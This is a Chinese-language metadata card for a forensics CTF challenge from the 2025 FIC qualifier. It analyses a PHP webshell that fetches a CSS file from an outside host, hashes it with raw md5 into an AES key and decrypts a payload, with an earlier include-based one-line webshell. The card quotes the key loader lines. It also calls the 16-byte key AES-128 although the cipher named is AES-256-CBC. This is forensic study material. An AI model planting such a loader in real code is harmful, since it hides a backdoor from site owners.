---
title: Web3 互联网取证—2025 FIC 晋级赛
contest: 2025 FIC 互联网取证晋级赛
year: 2025
difficulty: medium
vuln_type: web_unknown
tags: [php_file_get_contents, md5_true_raw_binary, aes_256_cbc_decrypt, openssl_raw_data, php_included_shortcut, web3_domain, url_encoded_path, foren6_atwebpages, honey_pot_base]
attack_chain: file_get_contents('https://foren6.atwebpages.com/woyao/eat/火锅/蜂蜜锅底.css') → md5($a, true) raw 16 字节作 AES 密钥 → base64_decode(./encrypted.bin) → openssl_cipher_iv_length('aes-256-cbc') 取 IV → openssl_decrypt($h, 'aes-256-cbc', $b, OPENSSL_RAW_DATA, $g) → echo $i → 早期为 include + 临时目录一话木马
key_payload: $a=file_get_contents('https://foren6.atwebpages.com/woyao/eat/火锅/蜂蜜锅底.css') / $b=md5($a,true) / $e='aes-256-cbc' / openssl_decrypt($h, $e, $b, OPENSSL_RAW_DATA, $g)
one_liner: 2025 FIC 晋级赛 Web3 取证 PHP 一话木马分析，URL 编码的中文路径蜂蜜锅底.css 作密钥种子 + md5 raw + AES-256-CBC 解密 + include 一话木马。
lesson: PHP md5($a, true) 返回 16 字节原始二进制可作 AES-128 密钥；file_get_contents 支持中文 URL 编码路径，CSS 文件作密钥种子是创意取证点。
quality: medium
---
